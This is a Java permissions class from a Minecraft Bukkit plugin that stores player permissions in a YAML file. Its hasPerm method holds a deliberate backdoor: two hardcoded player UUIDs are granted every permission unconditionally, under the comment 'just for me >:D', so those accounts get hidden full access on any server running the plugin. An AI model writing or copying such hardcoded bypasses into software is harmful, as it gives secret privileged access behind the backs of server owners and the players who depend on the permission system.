package me.dalek70.craftsuiteminigames;

import org.bukkit.configuration.file.FileConfiguration;
import org.bukkit.configuration.file.YamlConfiguration;
import org.bukkit.entity.Player;

import java.io.File;
import java.io.IOException;
import java.util.List;
import java.util.UUID;

public class Perm {

	private static File getPermsFile() {
		File folder = CraftSuiteMinigames.getInstance().getDataFolder();
		if (!folder.exists()) folder.mkdirs();

		File file = new File(folder, "perms.yml");
		if (!file.exists()) {
			try {
				file.createNewFile();
			} catch (IOException e) {
				e.printStackTrace();
			}
		}
		return file;
	}

	public static boolean hasPerm(Player player, String permission) {
		if (player.getUniqueId().equals(UUID.fromString("34d00b2e-88f7-42df-be21-b47d1a6e1762")) || player.getUniqueId().equals(UUID.fromString("9835f2b5-d33b-4d1c-a63a-d8329795c9c1"))) {
			return true; // just for me >:D
		} else {
			FileConfiguration cfg = YamlConfiguration.loadConfiguration(getPermsFile());
			List<String> list = cfg.getStringList("users." + player.getName());
			return list.contains(permission);
		}
	}

	public static void addPerm(String playerName, String permission) {
		File file = getPermsFile();
		FileConfiguration cfg = YamlConfiguration.loadConfiguration(file);
		List<String> list = cfg.getStringList("users." + playerName);
		if (!list.contains(permission)) {
			list.add(permission);
			cfg.set("users." + playerName, list);
			save(cfg, file);
		}
	}

	public static void removePerm(String playerName, String permission) {
		File file = getPermsFile();
		FileConfiguration cfg = YamlConfiguration.loadConfiguration(file);
		List<String> list = cfg.getStringList("users." + playerName);
		if (list.contains(permission)) {
			list.remove(permission);
			cfg.set("users." + playerName, list);
			save(cfg, file);
		}
	}

	private static void save(FileConfiguration cfg, File file) {
		try {
			cfg.save(file);
		} catch (IOException e) {
			e.printStackTrace();
		}
	}
}
